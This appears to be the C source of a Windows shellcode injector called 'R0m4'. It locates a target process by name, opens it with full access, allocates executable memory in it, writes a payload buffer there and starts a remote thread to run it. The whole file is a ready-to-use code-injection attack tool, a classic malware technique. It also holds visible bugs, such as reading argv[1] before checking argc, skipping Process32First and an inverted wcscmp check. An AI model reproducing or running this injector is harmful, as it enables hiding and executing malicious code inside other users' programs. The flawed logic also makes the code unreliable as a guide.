#include "Funcrions.h"

PROCESSENTRY32 Proc;

HANDLE hProcess, hThread = NULL;

int main(int argc, char* argv[]) {


	DWORD PID = NULL;
	const unsigned char* TargetName;
	TargetName = argv[1];
	if (argc < 2) {
		warning("you should enter the process name to inject the SHELLCODE in !! \n USAGE : R0m4.exe <Process Name>");
		return EXIT_FAILURE;
	}

	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	// Initialize the PROCESSENTRY32 structure
	Proc.dwSize = sizeof(PROCESSENTRY32);

	if (hSnapshot == INVALID_HANDLE_VALUE)
		return 1;
	do {
		if (strcmp(Proc.szExeFile, TargetName) == 0) {
			PID = Proc.th32ProcessID;
			okay("Great! We found the process: %s\n", TargetName);
			break;  // Exit loop once the process is found
		}
	} while (Process32Next(hSnapshot, &Proc));

	okay("We are trying to check the processes \n");
	if (wcscmp(Proc.szExeFile, TargetName)){
		PID = Proc.th32ProcessID;
		okay("Great We found the process ", TargetName);
	}

	info("Now we are trying to open the process with the ID : %ld \n", PID);

	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
	if (hProcess == NULL) {
		warning("The PID %ld doesn't exist you should try other stuff \n Error %ld \n ", PID, GetLastError());
		return EXIT_FAILURE;
	}

	info("We handled the process\n");
	rBuffer = VirtualAllocEx(hProcess, NULL, sizeof(R0m4InShell), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
	info("Allocated %zu-bytes with PAGE_EXECUTE_READWRITE permissions inside %ld", sizeof(R0m4InShell), PID);

	//Writing inside the allocated process

	WriteProcessMemory(hProcess, rBuffer, R0m4InShell, sizeof(R0m4InShell), NULL);
	info("Wrote %zu-bytes to process memory\n", sizeof(R0m4InShell));

	//Thread to run payload
	hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, 0, &TID);

	if (hThread == NULL) {

		warning("The PID %ld doesn't exist you should try other stuff \n Error %ld  ", PID, GetLastError());
		CloseHandle(hProcess);
		return EXIT_FAILURE;
	}
	okay("We got handle on the Thread %ld ----------0x%p", TID, hThread);


	okay("Cleaning up everything !!");
	info("waiting for thread to finish -_- \n");
	WaitForSingleObject(hThread, INFINITE);
	info("thread finished executing :) \n");
	CloseHandle(hProcess);
	CloseHandle(hThread);

	info("finished , see you next time mate :) ;)");


	return EXIT_SUCCESS;

}
